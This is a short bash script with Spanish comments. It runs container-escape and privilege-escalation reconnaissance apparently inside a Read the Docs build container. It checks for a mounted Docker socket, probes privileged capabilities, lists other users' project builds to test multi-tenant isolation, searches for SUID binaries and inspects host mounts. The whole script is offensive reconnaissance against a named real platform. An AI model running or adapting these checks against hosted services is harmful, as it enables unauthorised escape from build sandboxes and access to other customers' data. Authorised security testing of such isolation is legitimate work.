#!/bin/bash
echo "--- 1. BUSCANDO SOCKET DE DOCKER (EL SANTO GRIAL DEL ESCAPE) ---"
# Si el socket de docker está montado, puedes controlar el host físico.
ls -l /var/run/docker.sock

echo "--- 2. VERIFICANDO SI ES UN CONTENEDOR PRIVILEGIADO ---"
# Si ves muchos 1s o fffff, el contenedor tiene permisos casi de root en el host.
ip link add dummy0 type dummy 2>/dev/null && echo "¡POSIBLE ESCAPE: Puedo manipular interfaces de red!" || echo "Red restringida."
cat /proc/1/status | grep CapEff

echo "--- 3. BUSCANDO OTROS PROYECTOS (MULTI-TENANCY) ---"
# Este es el punto más crítico para Read the Docs.
ls -la /home/docs/checkouts/readthedocs.org/user_builds/

echo "--- 4. BUSCANDO BINARIOS SUID (ESCALADA INTERNA) ---"
find / -perm -4000 -type f 2>/dev/null | head -n 10

echo "--- 5. REVISANDO MONTURAS DEL SISTEMA ---"
# Buscamos si han montado carpetas del host (como /etc o /root) por error.
mount | grep -v "type tmpfs"
